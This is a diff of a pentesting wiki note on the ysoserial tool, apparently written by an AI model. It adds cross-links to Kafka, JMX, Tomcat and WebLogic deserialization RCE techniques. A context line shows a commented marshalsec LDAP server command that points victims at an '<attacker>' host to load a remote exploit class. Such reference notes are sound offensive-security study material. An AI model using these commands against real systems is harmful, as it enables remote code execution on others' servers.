@@ -18,11 +18,11 @@ java -jar ysoserial.jar --help
 # java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://<attacker>:8000/#Exploit"
 ```
 
-> [!note] **See also** — [[Services/Cloud & Data/Kafka|Apache Kafka]] — used for the Kafka Connect SASL-JAAS/JNDI RCE (CVE-2023-25194 / CVE-2025-27818) and the JMX deserialization RCE (CVE-2025-27819) gadget chains.
+> [!note] **See also** — [[Services/Cloud & Data/Kafka|Apache Kafka]] — used for the Kafka Connect SASL-JAAS/JNDI RCE (CVE-2023-25194 / CVE-2025-27818) and the JMX deserialization RCE (CVE-2025-27819) gadget chains. Also [[Services/Web Services/JMX|JMX]] — gadget-chain payloads for RMI/JMX deserialization (paired with `rmg`/beanshooter). Also [[Services/Web Services/Tomcat|Tomcat]] — serialized `.session` gadget for the CVE-2025-24813 partial-PUT deserialization RCE. Also [[Services/Web Services/WebLogic|WebLogic]] — gadget payloads for T3/IIOP deserialization.
 > Also used in [[Techniques/Deserialization|Deserialization]], [[Techniques/Non-PHP Web App Attacks|Non-PHP Web App Attacks]].
 
 ---
 
 *Created: 2026-07-29*
-*Updated: 2026-07-31*
+*Updated: 2026-09-25*
 *Model: claude-opus-5*
